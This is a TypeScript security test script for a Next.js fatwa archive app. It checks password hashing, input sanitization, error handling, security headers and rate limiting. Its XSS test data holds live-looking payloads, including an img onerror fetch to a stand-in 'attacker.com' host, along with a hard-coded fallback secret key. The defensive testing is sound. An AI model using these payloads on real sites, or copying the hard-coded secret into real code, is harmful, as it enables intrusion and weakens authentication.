import { hashPassword, verifyPassword } from '../lib/userAuth';
import crypto from 'crypto';
import { sanitizeString, sanitizeFatwaInput, stripAllHtml } from '../lib/sanitizer';
import { safeErrorResponse } from '../lib/apiErrors';
import { checkRateLimit, RateLimitTier } from '../lib/rateLimit';
import { NextRequest } from 'next/server';
import nextConfig from '../../next.config.mjs';

async function runSecurityHardeningTests() {
  console.log('\n======================================================');
  console.log('🔒 SECURITY & ARCHITECTURE HARDENING VERIFICATION TEST');
  console.log('======================================================\n');

  // ---------------------------------------------------------
  // 1. Password Hashing (scrypt with per-user salt)
  // ---------------------------------------------------------
  console.log('--- 1. Testing scrypt Password Hashing & Per-User Salt ---');
  const password = 'SuperSecretPassword2026!';
  const hash1 = hashPassword(password);
  const hash2 = hashPassword(password);

  console.log(`Generated Hash 1: ${hash1.slice(0, 30)}...`);
  console.log(`Generated Hash 2: ${hash2.slice(0, 30)}...`);

  if (!hash1.startsWith('scrypt:')) {
    throw new Error('Hash does not start with scrypt: prefix');
  }

  if (hash1 === hash2) {
    throw new Error('FAILED: Two hashes of same password must differ due to unique random salt per user!');
  }
  console.log('✅ Unique per-user salt verified: Two hashes of same password differ.');

  if (!verifyPassword(password, hash1)) {
    throw new Error('FAILED: verifyPassword returned false for correct password');
  }
  if (verifyPassword('WrongPassword123', hash1)) {
    throw new Error('FAILED: verifyPassword accepted incorrect password');
  }
  console.log('✅ scrypt password verification verified successfully.');

  // Test legacy HMAC-SHA256 backward compatibility
  const secret = process.env.INGESTION_SECRET_TOKEN || 'fatwa_archive_jwt_secret_key_2026';
  const legacyHmacHash = crypto.createHmac('sha256', secret).update(password).digest('hex');
  if (!verifyPassword(password, legacyHmacHash)) {
    throw new Error('FAILED: Legacy HMAC backward compatibility verification failed');
  }
  if (verifyPassword('WrongPassword123', legacyHmacHash)) {
    throw new Error('FAILED: Legacy HMAC accepted wrong password');
  }
  console.log('✅ Legacy HMAC-SHA256 backward compatibility verified: Existing user accounts remain valid.');

  // ---------------------------------------------------------
  // 2. Stored XSS Prevention & Sanitization
  // ---------------------------------------------------------
  console.log('\n--- 2. Testing Stored XSS Prevention & Input Sanitization ---');
  const maliciousInput = {
    title: 'বিশুদ্ধ নামায <script>alert("XSS")</script>',
    question: 'প্রশ্ন কি? <img src=x onerror="fetch(\'http://attacker.com\')">',
    answer: 'উত্তর বিস্তারিত <iframe src="javascript:alert(1)"></iframe>',
    category: '<b>সালাত</b>',
    scholar: '<script>evil()</script>শায়খ মাদানী',
    tags: ['<img onerror=alert(1)>নামায', 'তাহাজ্জুদ'],
  };

  const sanitized = sanitizeFatwaInput(maliciousInput);
  console.log('Sanitized Title:   ', sanitized.title);
  console.log('Sanitized Question:', sanitized.question);
  console.log('Sanitized Answer:  ', sanitized.answer);
  console.log('Sanitized Category:', sanitized.category);
  console.log('Sanitized Scholar: ', sanitized.scholar);
  console.log('Sanitized Tags:    ', sanitized.tags);

  if (sanitized.title.includes('<script>') || sanitized.title.includes('alert')) {
    throw new Error('FAILED: Script tag not stripped from title');
  }
  if (sanitized.question.includes('onerror') || sanitized.question.includes('attacker.com')) {
    throw new Error('FAILED: Dangerous event handler not stripped from question');
  }
  if (sanitized.answer.includes('<iframe') || sanitized.answer.includes('javascript:')) {
    throw new Error('FAILED: iframe or javascript: protocol not stripped from answer');
  }
  if (sanitized.scholar.includes('<script>')) {
    throw new Error('FAILED: HTML not stripped from scholar');
  }
  console.log('✅ Input sanitization completely neutralized all XSS vectors before database storage.');

  // ---------------------------------------------------------
  // 3. API Error Leak Prevention
  // ---------------------------------------------------------
  console.log('\n--- 3. Testing API Error Sanitization ---');
  const sensitiveError = new Error('SQLite disk I/O error at /tmp/fatwas.db on table fatwas_fts column 3: secret internal table details');

  // Test production mode
  const originalEnv = process.env.NODE_ENV;
  try {
    (process.env as any).NODE_ENV = 'production';
    const prodRes = safeErrorResponse('Internal server error during search', 500, sensitiveError);
    const prodBody = await prodRes.json();
    console.log('Production Error Response Body:', prodBody);

    if (prodBody.message || prodBody.debug || JSON.stringify(prodBody).includes('SQLite disk I/O')) {
      throw new Error('FAILED: Internal database error details leaked in production mode!');
    }
    if (prodBody.error !== 'Internal server error during search') {
      throw new Error('FAILED: Generic user-friendly error message not returned');
    }
    console.log('✅ Production error response verified: Zero internal error details leaked to client.');
  } finally {
    (process.env as any).NODE_ENV = originalEnv;
  }

  // ---------------------------------------------------------
  // 4. HTTP Security Headers in next.config.mjs
  // ---------------------------------------------------------
  console.log('\n--- 4. Testing HTTP Security Headers Configuration ---');
  if (typeof (nextConfig as any).headers !== 'function') {
    throw new Error('FAILED: next.config.mjs missing headers() function');
  }

  const configuredHeaders = await (nextConfig as any).headers();
  const rootRule = configuredHeaders.find((h: any) => h.source === '/:path*');
  if (!rootRule) {
    throw new Error('FAILED: No root header rule found for /:path*');
  }

  const headerKeys = new Set(rootRule.headers.map((h: any) => h.key.toLowerCase()));
  const requiredHeaders = [
    'strict-transport-security',
    'x-frame-options',
    'x-content-type-options',
    'referrer-policy',
    'permissions-policy',
    'content-security-policy',
  ];

  for (const reqHeader of requiredHeaders) {
    if (!headerKeys.has(reqHeader)) {
      throw new Error(`FAILED: Required security header missing: ${reqHeader}`);
    }
    const val = rootRule.headers.find((h: any) => h.key.toLowerCase() === reqHeader)?.value;
    console.log(`✅ ${reqHeader}: ${val?.slice(0, 55)}...`);
  }
  console.log('✅ All essential HTTP security headers verified in next.config.mjs.');

  // ---------------------------------------------------------
  // 5. Rate Limiting Multi-Tier Engine
  // ---------------------------------------------------------
  console.log('\n--- 5. Testing Multi-Tier Rate Limiting Engine ---');
  const mockReq = (ip: string) =>
    new NextRequest('http://localhost:3000/api/v1/auth/user', {
      headers: {
        'x-forwarded-for': ip,
      },
    });

  const testIp = `203.0.113.${Math.floor(Math.random() * 200) + 10}`;
  console.log(`Testing rate limit on IP: ${testIp} (auth tier limit: 10)`);

  // First 10 requests should succeed
  for (let i = 1; i <= 10; i++) {
    const res = await checkRateLimit(mockReq(testIp), 'auth');
    if (!res.success) {
      throw new Error(`FAILED: Request ${i} failed unexpectedly in rate limiter`);
    }
  }
  console.log('✅ Sent 10 requests: All 10 permitted.');

  // 11th request must be blocked
  const blockedRes = await checkRateLimit(mockReq(testIp), 'auth');
  console.log('11th request result:', blockedRes);
  if (blockedRes.success) {
    throw new Error('FAILED: 11th request was not blocked by rate limiter!');
  }
  console.log('✅ 11th request successfully blocked with 429 rate limit exceeded!');

  console.log('\n🎉 ALL 5 SECURITY & ARCHITECTURE HARDENING TESTS PASSED WITH 100% SUCCESS!\n');
}

runSecurityHardeningTests().catch((err) => {
  console.error('Security Hardening Test Failed:', err);
  process.exit(1);
});
